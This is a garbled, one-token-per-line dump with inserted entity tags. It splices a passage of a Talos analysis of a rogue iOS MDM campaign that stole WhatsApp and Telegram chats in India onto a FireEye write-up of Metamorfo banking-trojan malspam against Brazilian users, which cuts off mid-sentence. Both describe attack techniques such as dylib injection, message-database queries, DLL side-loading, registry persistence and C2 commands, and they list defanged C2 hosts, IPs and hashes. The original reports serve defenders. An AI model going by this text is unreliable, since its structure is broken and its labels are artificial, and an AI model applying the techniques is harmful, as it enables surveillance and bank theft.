attacker
used
the
BOptions
sideloading
technique
to
add
features
to
legitimate
apps
,
including
the
messaging
apps
WhatsApp
and
Telegram
,
that
were
then
deployed
by
the
MDM B_malware.infosteal
onto
the
13
targeted
devices
in
India
.

The
purpose
of
the
BOptions
sideloading
technique
is
to
inject
a
dynamic
library
in
the
application
.

The
malicious
code
inserted
into
these
apps
is
capable
of
collecting
and
exfiltrating
information
from
the
device
,
such
as
the
phone
number
,
serial
number
,
location
,
contacts
,
user's
photos
,
SMS
and
Telegram
and
WhatsApp
chat
messages
.

Such
information
can
be
used
to
manipulate
a
victim
or
even
use
it
for
blackmail
or
bribery
.

Thanks
to
the
logs
located
on
the
MDM B_malware.infosteal
servers
and
the
malware's
command
and
control
(
C2
)
server
,
we
were
able
to
determine
that
the
malware
has
been
in
use
since
August
2015
.

The
campaign
targeted
only
a
few
select
devices
(
13
)
that
are
all
located
in
India
.

The
attacker
left
essential
data
on
the
servers
,
such
as
emails
and
usernames
.

As
part
of
the
attacker's
development
and
testing
it
appears
that
they
compromised
their
device
—
we
observed
a
device
named
'
test
'
or
'
mdmdev
.
'
The
log
files
we
identified
contain
the
phone
number
of
the
device
.

The
number
originates
from
India
and
uses
the
'
Vodafone
India
'
network
with
roaming
capability
disabled
.

With
all
of
this
information
in
mind
,
we
assume
with
high
confidence
that
the
malware
author
works
out
of
India
.

MDM B_malware.infosteal
is
becoming
more
popular
throughout
large
enterprises
,
and
users
should
be
aware
that
installing
additional
certificates
on
their
device
to
allow
remote
management
can
result
in
potential
malicious
activity
.

By
installing
a
certificate
outside
of
the
Apple
iOS
trusted
certificate
chain
,
you
may
open
up
to
possible
third-party
attacks
like
this
.

Users
must
be
aware
that
accepting
an
MDM B_malware.infosteal
certificate
is
equivalent
to
allowing
someone
administrator
access
to
their
device
,
passwords
,
etc
.

This
must
be
done
with
great
care
in
order
to
avoid
security
issues
and
should
not
be
something
the
average
home
user
does
.

The
following
information
warns
the
security
community
and
users
of
how
this
attack
works
.

The
likely
use
of
social
engineering
to
recruit
devices
serves
as
a
reminder
that
users
need
to
be
wary
of
clicking
on
unsolicited
links
and
verify
identities
and
legitimacy
of
requests
to
access
devices
.

The
overall
workflow
of
the
deployment
method
and
capabilities
is
pictured
below
.

Convert
webpages
to
pdf
online
with
PDFmyURL

Vulnerability
Spotlight
:
Multiple

Adobe
Acrobat
DC
...

Threat
Roundup
for
June
29
to
July

Smoking
Guns
-
Smoke
Loader
learned
new
tricks
►
JUNE
(
15
)

►
MAY
(
15
)

►
APRIL
(
21
)

►
MARCH
(
10
)

►
FEBRUARY
(
14
)

►
JANUARY
(
18
)

►
2017
(
172
)

►
2016
(
98
)

►
2015
(
62
)

►
2014
(
67
)

►
2013
(
30
)

►
2012
(
53
)

►
2011
(
23
)

►
2010
(
93
)

►
2009
(
146
)

►
2008
(
37
)

RECOMMENDED
BLOGS

CISCO
BLOG

Field
Area
Network
Security
Webinar
–

Bringing
OT
and
IT
Together

SNORT
BLOG

Snort
Subscriber
Rule
Set
Update
for
07/17/2018

CLAMAV
®
BLOG

ClamAV
0.100.1
has
been
released
!

The
overall
workflow
of
the
deployment
method
and
capabilities
is
pictured
below
.

IOS
MDM
INFRASTRUCTURE

My
tiny
MDM B_malware.infosteal

Talos
identified
two
different
MDM B_malware.infosteal
servers
:

Convert
webpages
to
pdf
online
with
PDFmyURL

hxxp://ios-certificate-update[.]com B_url.unknown

hxxp://www[.]wpitcher[.]com B_url.unknown

Both
servers
above
are
based
on
the
open-source
project
mdm-server
—
a
small
iOS
MDM B_malware.infosteal
server
.

MDM B_malware.infosteal
allows
for
operating
system-level
control
of
multiple
devices
from
a
centralized
location
.

A
remote
administrator
can
install
or
remove
apps
,
install
or
revoke
certificates
,
lock
the
device
,
or
change
password
requirements
,
among
other
things
.

The
operator
is
able
to
uninstall
legitimate
applications
such
as
Telegram
and
WhatsApp
to
install
the
malicious
versions
described
in
the
next
section
.

Device
enrollment

Each
step
of
the
enrollment
process
needs
some
type
of
user
interaction
.

That's
why
Talos
assumes
the
attackers
use
social
engineering
to
get
victims
on
the
MDM B_malware.infosteal
.

The
first
step
for
enrolling
a
device
is
to
install
the
certificate
authority
:

Convert
webpages
to
pdf
online
with
PDFmyURL

If
the
user
clicks
on
'
Allow
,
'
the
following
message
is
displayed
:

Convert
webpages
to
pdf
online
with
PDFmyURL

By
clicking
on
'
Install
,
'
the
signature
will
switch
to
'
Verified
:
'

Convert
webpages
to
pdf
online
with
PDFmyURL

The
device
is
ready
to
be
enrolled
:

Convert
webpages
to
pdf
online
with
PDFmyURL

We
can
control
the
installed
profile
:

Convert
webpages
to
pdf
online
with
PDFmyURL

The
attacker
is
now
able
to
control
the
device
.

A
pop-up
appears
when
the
attacker
pushes
a
new
app
to
the
user
device
.

Here
is
an
example
with
the
compromised
Telegram
app
mentioned
later
in
the
article
:

Convert
webpages
to
pdf
online
with
PDFmyURL

This
gives
the
attacker
a
significant
level
of
control
over
the
victim
device
(
s
)
.

This
process
is
used
similarly
to
a
large-scale
enterprise
using
MDM B_malware.infosteal
solutions
.

It
is
likely
that
the
user
is
advised
that
the
certificate
must
be
installed
to
allow
enrollment
.

This
is
most
likely
performed
via
a
social
engineering
mechanism
,
i.e.
a
fake
tech
support-style
call
.

The
attacker
used
a
domain
which
allowed
them
to
try
and
fool
the
user
.

The
use
of
'
ios-certificateupdate[.]com B_url.unknown
'
may
make
it
easier
to
reassure
the
user
that
this
is
normal
.

Since
we
believe
this
attack
is
targeting
devices
in
India
this
is
also
something
which
a
non-native
English
speaker
may
see
as
'
normal
.
'

The
certificate
and
update
naming
convention
is
also
designed
to
trick
the
user
.

Technical
information
about
the
MDM B_malware.infosteal

The
attacker
left
a
lot
of
information
behind
,
which
allowed
us
to
analyse
files
used
by
this
MDM B_malware.infosteal
.

First
,
the
certificate
used
by
the
MDM B_malware.infosteal
:

CA.crt
:

Serial
Number
:
13905745817900070731
(
0xc0fb222544ceb74b
)

Issuer
:
C=CR
,
ST=Split
,
L=Split
,
O=NA
,
OU=IT
,
CN=ios-certificateupdate.com/emailAddress=nicholas.vukoja@mail.ru

Validity

Not
Before
:
Sep
6
11:33:09
2017
GMT

Not
After
:
Sep
6
11:33:09
2018
GMT

Subject
:
C=CR
,
ST=Split
,
L=Split
,
O=NA
,
OU=IT
,
CN=ios-certificateupdate.com/emailAddress=nicholas.vukoja@mail.ru

Convert
webpages
to
pdf
online
with
PDFmyURL

The
certificate
was
issued
in
September
2017
and
contains
an
email
address
located
in
Russia
.

Our
investigation
suggests
that
the
attacker
is
not
based
out
of
Russia
.

We
assume
this
is
a
false
flag
to
point
researchers
toward
the
idea
of
a
'
classical
Russian
hacker
.
'

False
flags
are
becoming
more
common
in
malware
,
both
sophisticated
and
simple
.

It's
an
attempt
to
muddy
the
waters
for
the
analysts
/
researchers
to
direct
blame
elsewhere
.

Identity.p12
:

Serial
Number
:
14177612590375883362
(
0xc4c0ff88e475d262
)

Issuer
:
C=CR
,
ST=Split
,
L=Split
,
O=NA
,
OU=IT
,
CN=ios-certificateupdate.com/emailAddress=Aleksi.Dushku@mail.ru

Validity

Not
Before
:
Jan
6
04:59:56
2018
GMT

Not
After
:
Jan
6
04:59:56
2019
GMT

Subject
:
C=CR
,
ST=Split
,
L=Split
,
O=NA
,
OU=IT
,
CN=ios-certificateupdate.com/emailAddress=Aleksi.Dushku@mail.ru

This
is
another
certificate
,
which
points
to
an
apparent
reference
to
Russia
by
using
another
mail.ru
address
.

Server.csr
:

Subject
:
C=HR
,
ST=Hrvatska
,
L=Split
,
O=NA
,
OU=IT
,
CN=ios-certificateupdate.com/emailAddress=nicholas.vukoja@mail.ru

In
this
certificate
,
the
attacker
mentioned
Hrvatska
(
'
Croatia
'
in
the
Croatian
language
)
with
the
same
Russian
email
.

Convert
webpages
to
pdf
online
with
PDFmyURL

The
certificates
are
self-signed
,
or
signed
by
the
Comodo
certificate
authority
.

Log
analysis

One
of
the
most
interesting
pieces
of
information
about
the
MDM B_malware.infosteal
is
found
in
the
log
file
.

Because
of
this
,
we
can
confirm
the
following
points
:

There
are
13
compromised
devices
based
off
serial
number

All
the
devices
are
located
in
India
(
based
on
the
phone
numbers
and
phone
providers
)

Phone
models
:
iPhone
5.4
,
iPhone
7.2
,
iPhone
8.1
,
iPhone
8.2
,
iPhone
9.3
,
iPhone
9.4

iOS
versions
:
10.2.1
,
10.3.1
,
10.3.2
,
10.3.3
,
11.0
,
11.0.3
,
11.2.1
,
11.2.5
,
11.2.6

At
this
time
,
we
don't
know
how
the
attacker
enrolled
the
13
targeted
devices
into
the
MDM B_malware.infosteal
.

It
could
be
through
physical
access
to
the
phones
,
or
by
using
social
engineering
,
motivating
the
user
to
enroll
their
device
.

We
believe
the
attackers
used
their
personal
phone
to
test
the
MDM B_malware.infosteal
because
they
included
devices
named
'
Test
'
and
'
mdmdev
.
'

These
two
devices
share
the
same
phone
number
and
a
name
that
is
uncommon
for
a
personal
phone
.

The
phone
number
originates
from
India
and
is
registered
on
the
'
Vodafone
India
'
network
provider
.

When
the
device
was
registered
on
the
MDM B_malware.infosteal
server
,
roaming
was
disabled
.

We
assess
with
high
confidence
that
the
author
is
based
out
of
in
India
.

IOS
APPLICATIONS

Malicious
applications
using
BOptions
sideloading

EXPLANATION

Convert
webpages
to
pdf
online
with
PDFmyURL

The
attacker's
purpose
appears
to
deploy
malicious
apps
onto
the
13
compromised
devices
.

To
do
The
attacker's
purpose
appears
to
deploy
malicious
apps
onto
the
13
compromised
devices
.

To
do
so
,
they
decided
to
use
the
BOptions
sideloading
technique
.

The
technique
is
described
here
.

The
purpose
is
to
inject
a
dynamic
library
into
the
legitimate
app
.

The
GitHub
project
was
used
by
the
attacker
to
create
the
malicious
BOptionspro.dylib
library
held
in
the
iOS
package
(
.ipa
file
)
.

The
injection
library
can
ask
for
additional
permissions
,
execute
code
and
steal
information
from
the
original
application
,
among
other
things
.

Milan-based
technology
company
HackingTeam
has
previously
used
this
technique
.

TELEGRAM
,
WHATSAPP
&
APPSSLOADER

In
this
campaign
we
identified
three
compromised
versions
of
apps
using
this
trick
hosted
on
the
MDM B_malware.infosteal
server
.

AppsSLoader
is
seemingly
harmless
.

The
app
was
created
to
test
the
library
injection
.

It
simply
opens
a
pop-up
to
the
user
confirming
the
execution
of
the
dynamic
library
.

This
was
most
likely
created
to
test
the
effectiveness
of
the
library
prior
to
malicious
deployment
.

The
compromised
versions
of
the
Telegram
and
WhatsApp
applications
used
in
this
campaign
are
more
interesting
and
relevant
.

They
first
contain
the
same
malicious
code
.
The
purpose
is
to
send
collected
data
to
a
C2
server
located
at
hxxp[:]//techwach[.]com B_url.unknown
.

The
malicious
code
checks
permissions
and
asks
for
additional
permissions
if
it
does
not
already
have
them
:

Permission
to
access
the
user's
contact
list
(
PhnNumber::getContAccess
)

Permission
to
access
the
user's
photos
(
PhnNumber::getPAccess
)

Convert
webpages
to
pdf
online
with
PDFmyURL

Permission
to
access
the
user's
photos
(
PhnNumber::getPAccess
)

One
of
the
most
relevant
features
of
these
compromised
versions
of
the
applications
is
the
Telegram
and
WhatsApp
message
stealing
feature
.

Here
is
the
global
workflow
of
it
:

For
Telegram
:

Opens
'
tgdata.db
'
,
an
SQLite3
database
used
by
Telegram

Checks
for
the
key
'
UPLOADED_CHAT
'
in
the
key
store

Queries
'
select
users_v29.phone_number
,
users_v29.uid
from
users_v29;
'

Queries
for
'
select
messages_v29.from_id
AS
oid,users_v29.first_name
,
users_v29.last_name,users_v29.phone_number,messages_v29.message,messages_v29
.mid,messages_v29.to_id
from
messages_v29
join
users_v29
ON
(
messages_v29.from_id
=
users_v29.uid);
'

Parses
results
,
storing
off
counts
,
timestamps
,
and
other
metadata
.

Sends
by
posting
to
hxxp[:]//techwach[.]com B_url.unknown

Query
screenshot
:

For
WhatsApp
:

Convert
webpages
to
pdf
online
with
PDFmyURL

Opens
'
ChatStorage.sqlite
'
,
the
database
used
for
WhatsApp
messages

Queries
'
SELECT
Z_PK,ZFROMJID,ZTOJID,ZPUSHNAME,ZTEXT,ZMESSAGEDATE

Queries
'
SELECT
Z_PK,ZFROMJID,ZTOJID,ZPUSHNAME,ZTEXT,ZMESSAGEDATE

FROM
ZWAMESSAGE
WHERE
Z_PK
>
'
%d
'
'

Parses
results
,
storing
off
counts
,
timestamps
,
and
other
metadata
.

Sends
by
posting
to
hxxp[:]//techwach[.]com B_url.unknown

Additionally
,
the
malware
is
designed
to
be
able
to
send
the
contacts
,
location
,
and
images
from
the
compromised
device
.

Here
is
the
list
of
the
PHP
pages
available
on
the
techwach
C2
server
:

all.php
dyrKztORKwVWOGo.php
get.php
hh.php
info.php
jDRucchWSoWQGpU.php
UfmcRxYDaVVbrBl.php

Another
intriguing
aspect
of
this
malware
is
the
way
in
which
the
malicious
code
achieves
periodic
code
execution
when
the
legitimate
app
bundled
with
it
is
running
.

One
technique
is
to
modify
the
app's
code
at
runtime
to
execute
the
malicious
code
—
this
has
been
observed
in
previously
analyzed
iOS
malware
.

Instead
,
this
malware
remains
almost
entirely
independent
of
the
app
and
gains
execution
by
creating
a
timer
that
eventually
executes
the
malicious
code
in
a
background
thread
.

From
there
,
it
schedules
tasks
to
be
executed
asynchronously
in
the
background
by
leveraging
the
apps
'
background
task
queue
.

Ultimately
,
this
means
that
the
malicious
code
is
invisible
to
the
user
of
the
app
,
and
can
be
easily
reused
alongside
any
real
application
.

PRAYTIME

Talos
identified
another
legitimate
app
executing
malicious
code
during
this
campaign
in
India
.

PrayTime
is
used
to
give
the
user
a
notification
when
it's
time
to
pray
.

The
malicious
code
connects
to
the
domain
voguextra[.]com B_url.unknown
.

The
purpose
is
to
download
and
display
specific
ads
to
the
user
.

Convert
webpages
to
pdf
online
with
PDFmyURL

This
app
also
leverages
private
frameworks
to
read
the
SMS
messages
on
the
device
it
is
installed
on
and
uploads
these
to
the
C2
server
.

MYAPP

MyApp
is
a
regular
iOS
app
.
However
,
the
application
does
not
do
anything
.

It
has
almost
no
code
associated
with
it
other
than
standard
iOS
app
runtime
code
.

This
could
potentially
be
another
testing
app
,
but
we're
unable
to
determine
the
exact
use
.

This
app
is
non-malicious
.

Techwach
C2
server

The
malicious
code
within
Telegram
and
WhatsApp
sent
collected
data
to
the
server
techwach[.]com B_url.unknown
.

The
server
has
been
active
since
August
2015
.

Initially
,
the
username
used
on
the
server
was
arnoldrex
.

Subsequently
,
this
was
changed
to
chernobog
(
referencing
a
Slavic
deity
)
.

CONCLUSION

This
investigation
shows
us
that
this
attack
targeted
a
very
limited
number
(
13
)
of
users
using
iPhone
devices
in
India
.

At
the
time
,
it
is
unclear
who
the
targets
of
the
campaign
were
,
who
was
the
perpetrator
,
or
what
the
exact
purpose
was
.

It's
very
likely
the
vector
for
this
campaign
was
simply
social
engineering
-
in
other
words
asking
the
user
to
click
'
ok
'
.

This
type
of
vector
is
very
difficult
to
defend
against
since
users
can
often
be
tricked
into
acting
against
their
best
interests
.

This
is
another
important
reminder
that
users
must
think
twice
before
clicking
on
unsolicited
links
or
requests
and
also
that
users
should
verify
credentials
from
any
unsolicited
calls
requesting
they
take
action
on
devices
.

Convert
webpages
to
pdf
online
with
PDFmyURL

The
attackers
installed
an
open-source
MDM B_malware.infosteal
and
used
this
to
deploy
malicious
code
into
secure
The
attackers
installed
an
open-source
MDM B_malware.infosteal
and
used
this
to
deploy
malicious
code
into
secure
chat
applications
such
as
Telegram
and
WhatsApp
to
surreptitiously
retrieve
the
messages
/
chats
,
photos
and
user's
location
from
the
victim's
phone
.

Over
a
three-year
period
,
the
attackers
remained
under
the
radar
—
likely
due
to
the
low
number
of
compromised
devices
.

All
the
technical
details
point
to
an
actor
based
in
the
same
country
as
the
victims
:
India
.

The
attacker
tried
to
mimic
Russian
hackers
by
using
mail.ru
email
.

However
,
we
found
testing
devices
enrolled
on
the
MDM B_malware.infosteal
with
an
Indian
phone
number
and
registered
on
an
Indian
provider
.

Once
a
user
has
lost
physical
access
to
their
phone
,
it's
really
a
case
of
the
attacker
having
a
much
easier
playing
field
for
malicious
activity
.

The
fact
that
the
attacker
was
also
able
to
get
devices
onto
his
own
malicious
MDM B_malware.infosteal
shows
that
the
attacker
was
indeed
motivated
to
obtain
initial
access
but
also
to
maintain
persistence
across
the
devices
.

COVERAGE

Additional
ways
our
customers
can
detect
and
block
this
threat
are
listed
below
.

Advanced
Malware
Protection
(
AMP
)
is
ideally
suited
to
prevent
the
execution
of
the
malware
used
by
these
threat
actors
.

Cisco
Cloud
Web
Security
(
CWS
)
or
Web
Security
Appliance
(
WSA
)
web
scanning
prevents
access
to
malicious
websites
and
detects
malware
used
in
these
attacks
.

Email
Security
can
block
malicious
emails
sent
by
threat
actors
as
part
of
their
campaign
.

Network
Security
appliances
such
as
Next
-
Generation
Firewall
(
NGFW
)
,
Next
-
Generation
Intrusion
Prevention
System
(
NGIPS
)
,
and
Meraki
MX
can
detect
malicious
activity
associated
with
this
threat
.

Convert
webpages
to
pdf
online
with
PDFmyURL

AMP
Threat
Grid
helps
identify
malicious
binaries
and
build
protection
into
all
Cisco
Security
products
.

Umbrella
,
our
secure
internet
gateway
(
SIG
)
,
blocks
users
from
connecting
to
malicious
domains
,
IPs
,
and
URLs
,
whether
users
are
on
or
off
the
corporate
network
.

Open
Source
Snort
Subscriber
Rule
Set
customers
can
stay
up
to
date
by
downloading
the
latest
rule
pack
available
for
purchase
on
Snort.org
.

IOCS

iOSApplications

329e025866bc6e88184af0b633eb3334b2e8b1c0817437c03fcd922987c5cf04

AppsSLoader.ipa

aef046b67871076d507019cd87afdaeef602d1d2924b434ec1c165097b781242

MyApp.ipa

4be31095e5f010cc71cf8961f8fe3fc3ed27f8d8788124888a1e90cb90b2bef1

PrayTime.ipa

624689a1fd67891be1399811d6008524a506e7e0b262f549f5aa16a119369aef

Telegram.ipa

e3872bb33d8a4629846539eb859340940d14fdcf5b1c002b57c7dfe2adf52f08

Wplus.ipa

MDM B_malware.infosteal
Domains
:

ios-certificate-update[.]com B_url.unknown

www[.]wpitcher[.]com B_url.unknown

C2
Domains
:

Voguextra[.]com B_url.unknown

Techwach[.]com B_url.unknown

Convert
webpages
to
pdf
online
with
PDFmyURL

Advertising
Domain
:
voguextra[.]com B_url.unknown

POSTED
BY
PAULRASCAGNERESAT
3:00
PM

LABELS
:
APPLE
,
INDIA
,
IOS
,
IPHONE
,
MALWARE
ANALYSIS
,
MALWARE
RESEARCH
,
MDM

SHARE
THIS

POST

NO
COMMENTS
:

POST
A
COMMENT

Enter
your
comment
...

Comment
as
:
Google
Account

Convert
webpages
to
pdf
online
with
PDFmyURL

Publish

Publish

Preview

Preview

NEWER

POST

HOME

SUBSCRIBE
TO
:
POST
COMMENTS
(
ATOM
)

OLDER

POST

Software

Reputation
Center

Vulnerability
Information

Library

Support
Communities

Microsoft
Advisory
Snort
Rules

IP
Blacklist
Download

AWBO
Exercises

About
Talos

Careers

Blog

CONNECT
WITH
US
©
2018
Cisco
Systems
,
Inc
.

and/or
its
affiliates
.

All
rights
reserved
.

View
our
Privacy
Policy
here
.

Convert
webpages
to
pdf
online
with
PDFmyURL
Solutions

Services

Partners

Support

Resources

Company

Home

FireEye
Blogs

Threat
Research

Metamorfo B_malware.drop
Campaigns
Targeting
Brazilian
Users

Metamorfo B_malware.drop
Campaigns
Targeting
Brazilian
Users

Metamorfo B_malware.drop
Campaigns
Targeting
Brazilian
Users

April
24
,
2018
|
by
Edson
Sierra
,
Gerardo
Iglesias

FireEye
Labs
recently
identified
several
widespread
malspam
(
malware
spam
)
campaigns
targeting
Brazilian
companies
with
the
goal
of
delivering
banking
Trojans
.

We
are
referring
to
these
campaigns
as
Metamorfo B_malware.drop
.

Across
the
stages
of
these
campaigns
,
we
have
observed
the
use
of
several
tactics
and
techniques
to
evade
detection
and
deliver
the
malicious
payload
.

In
this
blog
post
we
dissect
two
of
the
main
campaigns
and
explain
how
they
work
.

Campaign
#1

The
kill
chain
starts
with
an
email
containing
an
HTML
attachment
with
a
refresh
tag
that
uses
a
Google
URL
shortener
as
the
target
.

Figure
1
shows
a
sample
email
,
and
Figure
2
show
the
contents
of
the
HTML
file
.

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

Figure
1
:
Malicious
Email
with
HTML
Attachment

Figure
2
:
Contents
of
HTML
File

When
the
URL
is
loaded
,
it
redirects
the
victim
to
a
cloud
storage
site
such
as
GitHub
,
Dropbox
,
or
Google
Drive
to
download
a
ZIP
file
.

An
example
is
shown
in
Figure
3
.

Figure
3
:
URL
Shortener
Redirects
to
Github
Link

The
ZIP
archive
contains
a
malicious
portable
executable
(
PE
)
file
with
embedded
HTML
application
(
HTA
)
.

The
user
has
to
unzip
the
archive
and
double-click
the
executable
for
the
infection
chain
to
continue
.

The
PE
file
is
a
simple
HTA
script
compiled
into
an
executable
.

When
the
user
double-clicks
the
executable
,
the
malicious
HTA
file
is
extracted
to
%temp%
and
executed
by
mshta.exe
.

The
HTA
script
(
Figure
4
)
contains
VBS
code
that
fetches
a
second
blob
of
VBS
code
encoded
in
base64
form
from
hxxp://<redacted>/ilha/pz/logs.php
.

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

Figure
4
:
Contents
of
HTA
File

After
the
second
stage
of
VBS
is
decoded
(
Figure
5
and
Figure
6
)
,
the
script
downloads
the
final
stage
from
hxxp://<redacted>/28022018/pz.zip
.

Figure
5
:
Contents
of
Decoded
VBS

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

Figure
6
:
More
Contents
of
Decoded
VBS

The
downloaded
ZIP
file
contains
four
files
.

Two
are
PE
files
.

One
is
a
legitimate
Windows
tool
,
pvk2pfx.exe
,
that
is
abused
for
DLL
side-loading
.

One
is
the
malicious
banking
Trojan
as
the
DLL
.

The
VBS
code
unzips
the
archive
,
changes
the
extension
of
the
legitimate
Windows
tool
from
.png
to
.exe
,
and
renames
the
malicious
DLL
as
cryptui.dll
.

The
VBS
code
also
creates
a
file
in
C:\Users\Public\Administrador\car.dat
with
random
strings
.

These
random
strings
are
used
to
name
the
Windows
tool
,
which
is
then
executed
.

Since
this
tool
depends
on
a
legitimate
DLL
named
cryptui.dll
,
the
search
order
path
will
find
the
malicious
Trojan
with
the
same
name
in
the
same
directory
and
load
it
into
its
process
space
.

In
Q4
of
2017
,
a
similar
malspam
campaign
delivered
the
same
banking
Trojan
by
using
an
embedded
JAR
file
attached
in
the
email
instead
of
an
HTML
attachment
.

On
execution
,
the
Java
code
downloaded
a
ZIP
archive
from
a
cloud
file
hosting
site
such
as
Google
Drive
,
Dropbox
,
or
Github
.

The
ZIP
archive
contained
a
legitimate
Microsoft
tool
and
the
malicious
Trojan
.

Banking
Trojan
Analysis

The
Trojan
expects
to
be
located
in
the
hardcoded
directory

C:\\Users\\Public\Administrador\\
along
with
three
other
files
to
start
execution
.

As
seen
in
Figure
7
,
these
files
are
:
car.dat
(
randomly
generated
name
given
to
Windows
tool
)
i4.dt
(
VBS
script
that
downloads
the
same
zip
file
)
id
(
ID
given
to
host
)
cryptui.dll
(
malicious
Trojan
)

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

cryptui.dll
(
malicious
Trojan
)

Figure
7
:
Contents
of
ZIP
Archive

Persistence

The
string
found
in
the
file
C:\\Users\\Public\\Administrador\\car.dat
is
extracted
and
used
to
add
the
registry
key
Software\Microsoft\Windows\CurrentVersion\Run\<string
from
car.dat>
for
persistence
,
as
shown
in
Figure
8
.

Figure
8
:
Reading
from
car.dat
File

The
sample
also
looks
for
a
file
named
i4.dt
in
the
same
directory
and
extracts
the
contents
of
it
,
renames
the
file
to
icone.vbs
,
and
creates
a
new
persistent
key
(
Figure
9
)

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

contents
of
it
,
renames
the
file
to
icone.vbs
,
and
creates
a
new
persistent
key
(
Figure
9
)
in
\Software\Microsoft\Windows\CurrentVersion\Run
to
open
this
file
.

Figure
9
:
Persistence
Keys

The
VBS
code
in
this
file
(
Figure
10
)
has
the
ability
to
recreate
the
whole
chain
and
download
the
same
ZIP
archive
.

Figure
10
:
Contents
of
VBS
Script

Next
,
the
Trojan
searches
for
several
folders
in
the
Program
Files
directories
,
including
:

C:\\ProgramFiles\\AVG

C:\\ProgramFiles\\AVASTSoftware

C:\\ProgramFiles\\Diebold\\Warsaw

C:\\ProgramFiles\\Trusteer\\Rapport

C:\\ProgramFiles\\Java

C:\\ProgramFiles(x86)\\scpbrad

If
any
of
the
folders
are
found
,
this
information
,
along
with
the
hostname
and
Operating
System
version
,
is
sent
to
a
hardcoded
domain
with
the
hardcoded
User-Agent
value

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

System
version
,
is
sent
to
a
hardcoded
domain
with
the
hardcoded
User-Agent
value
'
Mozilla/5.0
(
Windows
NT
6.1;
WOW64;
rv:12.0
)
Gecko/20100101
Firefox/12.0
'
in
the
format
shown
in
Figure
11
.

The
value
of
AT
is
'
<host_name+OS&MD>=<list
of
folders
found>
'
.

Figure
11
:
Network
Traffic
for
Host
Enumeration

The
sample
iterates
through
the
running
processes
,
kills
the
following
,
and
prevents
them
from
launching
:

msconfig.exe

TASKMGR.exe

regedit.exe

ccleaner64.exe

taskmgr.exe

itauaplicativo.exe

Next
,
it
uses
GetForegroundWindow
to
get
a
handle
to
the
window
the
user
is
viewing
and
GetWindowText
to
extract
the
title
of
the
window
.

The
title
is
compared
against
a
hardcoded
list
of
Brazilian
banking
and
digital
coin
sites
.

The
list
is
extensive
and
includes
major
organizations
and
smaller
entities
alike
.

If
any
of
those
names
are
found
and
the
browser
is
one
of
the
following
,
the
Trojan
will
terminate
that
browser
.

firefox.exe

chrome.exe

opera.exe

safari.exe

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

The
folder
C:\Users\Public\Administrador\logs\
is
created
to
store
screenshots
,
as
well
The
folder
C:\Users\Public\Administrador\logs\
is
created
to
store
screenshots
,
as
well
as
the
number
of
mouse
clicks
the
user
has
triggered
while
browsing
the
banking
sites
(
Figure
12
)
.

The
screenshots
are
continuously
saved
as
.jpg
images
.

Figure
12
:
Malware
Capturing
Mouse
Clicks

Command
and
Control

The
command
and
control
(
C2
)
server
is
selected
based
on
the
string
in
the
file
'
id
'
:

al
->
'
185.43.209[.]182 B_ip.unknown
'

gr
->
'
212.237.46[.]6 B_ip.unknown
'

pz
->
'
87.98.146[.]34 B_ip.unknown
'

mn
->
'
80.211.140[.]235 B_ip.unknown
'

The
connection
to
one
of
the
hosts
is
then
started
over
raw
TCP
on
port
9999
.

The
command
and
control
communication
generally
follows
the
pattern
<|Command
|>
,
for
example
:

'
<|dispida|>logs>SAVE<
'
sends
the
screenshots
collected
in
gh.txt
.

'
<PING>
'
is
sent
from
C2
to
host
,
and
'
<PONG>
'
is
sent
from
host
to
C2
,
to
keep
the
connection
alive
.

'
<|INFO|>
'
retrieves
when
the
infection
first
started
based
on
the
file
timestamp
from
car.dat
along
with
'
<|>
'
and
the
host
information
.

There
were
only
four
possible
IP
addresses
that
the
sample
analyzed
could
connect
to

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

There
were
only
four
possible
IP
addresses
that
the
sample
analyzed
could
connect
to
based
on
the
strings
found
in
the
file
'
id
'
.

After
further
researching
the
associated
infrastructure
of
the
C2
(
Figure
13
)
,
we
were
able
to
find
potential
number
of
victims
for
this
particular
campaign
.

Figure
13
:
Command
and
Control
Server
Open
Directories

Inside
the
open
directories
,
we
were
able
to
get
the
following
directories
corresponding
to
the
different
active
campaigns
.

Inside
each
directory
we
could
find
statistics
with
the
number
of
victims
reporting
to
the
C2
.

As
of
3/27/2018
,
the
numbers
were
:

al
–
843

ap
–
879

gr
–
397

kk
–
2,153

mn
–
296

pz
–
536

tm
–
187

A
diagram
summarizing
Campaign
#1
is
shown
in
Figure
14
.

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

Figure
14
:
Infection
Chain
of
Campaign
#1

Campaign
#2

In
the
second
campaign
,
FireEye
Labs
observed
emails
with
links
to
legitimate
domains
(
such
as
hxxps://s3-ap-northeast1.amazonaws[.]com/<redacted>/Boleto_Protesto_Mes_Marco_2018.html B_url.unknown
)
or
compromised
domains
(
such
as
hxxps://curetusu.<redacted>-industria[.]site/ B_url.unknown
)
that
use
a
refresh
tag
with
a
URL
shortener
as
the
target
.

The
URL
shortener
redirects
the
user
to
an
online
storage
site
,
such
as
Google
Drive
,
Github
,
or
Dropbox
,
that
hosts
a
malicious
ZIP
file
.

A
sample
phishing
email
is
shown
in
Figure
15
.

Web
page
converted
to
PDF
with
the
PDFmyURL
PDF
creation
API
!

Figure
15
:
Example
Phishing
Email

The
ZIP
file
contains
a
malicious
executable
written
in
AutoIt
(
contents
of
this
executable
are
shown
in
Figur
16
)
.

When
executed
by
the
user
,
it
drops
a
VBS
file
to
a
randomly
created
and
named
directory
(
such
as
C:\mYPdr\TkCJLQPX\HwoC\mYPdr.vbs
)
and
fetches
contents
from
the
C2
server
.

Figure
16
:
Contents
of
Malicious
AutoIt
Executable

Two
files
are
downloaded
from
the
C2
server
.

One
is
a
legitimate
Microsoft
tool
and
the
other
is
a
malicious
DLL
:
https[:]//panel-dark[.]com/w3af/img2.jpg B_url.unknown

https[:]//panel-dark[.]com/w3af/img1.jpg B_url.unknown

Those
files
are
downloaded
and
saved
into
random
directories
named
with
the
following
patterns
:

<current
user
dir>\<5
random
chars>\<8
random
chars>\<4
random
chars>\<5
random
chars>.exe

<current
user
dir>\<5
random
chars>\<8
random
chars>\<4
random
chars>\CRYPTUI.dll

The
execution
chain
ensures
that
persistence
is
set
on
the
